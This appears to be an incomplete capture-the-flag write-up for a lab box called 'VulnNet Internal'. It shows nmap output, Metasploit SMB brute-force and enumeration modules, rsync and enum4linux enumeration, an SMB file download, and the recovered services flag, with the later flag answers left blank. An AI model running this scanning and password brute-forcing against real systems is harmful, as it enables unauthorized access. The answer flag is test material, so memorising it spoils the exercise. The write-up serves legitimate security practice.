## VulnNet Internal

```
nmap -p- -sV -sC 10.10.34.98 -v 
```

```
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e278f48ae2ff889bb8913e39afd6340 (RSA)
|   256 f4fe0be25c88b563138550ddd586abbd (ECDSA)
|_  256 82ea4885f02a237e0ea9d9140a602fad (ED25519)
111/tcp   open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      45559/udp   mountd
|   100005  1,2,3      52619/tcp6  mountd
|   100005  1,2,3      57663/tcp   mountd
|   100005  1,2,3      59714/udp6  mountd
|   100021  1,3,4      42201/tcp   nlockmgr
|   100021  1,3,4      45733/tcp6  nlockmgr
|   100021  1,3,4      53227/udp6  nlockmgr
|   100021  1,3,4      59390/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs_acl     3 (RPC #100227)
6379/tcp  open     redis       Redis key-value store
9090/tcp  filtered zeus-admin
35887/tcp open     mountd      1-3 (RPC #100005)
40983/tcp open     mountd      1-3 (RPC #100005)
42201/tcp open     nlockmgr    1-4 (RPC #100021)
57663/tcp open     mountd      1-3 (RPC #100005)
MAC Address: 02:F2:EC:47:C5:8D (Unknown)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2024-09-22T21:53:06+02:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   VULNNET-INTERNA<00>  Flags: <unique><active>
|   VULNNET-INTERNA<03>  Flags: <unique><active>
|   VULNNET-INTERNA<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-time: 
|   date: 2024-09-22T19:53:06
|_  start_date: N/A

```

Attempting to brute force the login of the SMB share 
using the rock you database for passwords 
and the unix_users.txt for users
```
msfconsole 
use auxiliary/scanner/smb/smb_login
```


```
use auxilaiary/scanner/rsync/modules_list

[+] 10.10.34.98:873       - 1 rsync modules found: files
```

Enumerate IP address with enum4linux 
Checking what operating system is running on the target ip 
```
enum4linux -O 10.10.138.202

//10.10.138.202/shares  Mapping: OK Listing: OK Writing: N/A
```

```
msfconolse auxiliary(scanner/smb/smb_enumusers)

[+] 10.10.138.202:139     - VULNNET-INTERNAL [  ] ( LockoutTries=0 PasswordMin=5 )

```

```
msfconsole auxiliary(admin/smb/list_directory)


[*] 10.10.138.202:445 - Directory Listing of \\10.10.138.202\shares\temp
================================================

  SIZE  TYPE  TIME                   FILENAME
  ----  ----  ----                   --------
  0 B   D     2021-02-02 09:02:50AM  ..
  0 B   D     2021-02-06 11:02:25AM  .
  38 B  F     2021-02-06 11:02:25AM  services.txt
```


```
msf6 auxiliary(admin/smb/download_file) > exploit 

[+] 10.10.138.202:445     - temp/services.txt saved as: /root/.msf4/loot/20241001004735_default_10.10.138.202_smb.shares.file_081197.txt
[*] 10.10.138.202:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```


#### Questions


What is the services flag? (services.txt)
```
THM{0a09d51e488f5fa105d8d866a497440a}
```

What is the internal flag? ("internal flag")
```

```

What is the user flag? (user.txt)
```

```

What is the root flag? (root.txt)
```

```
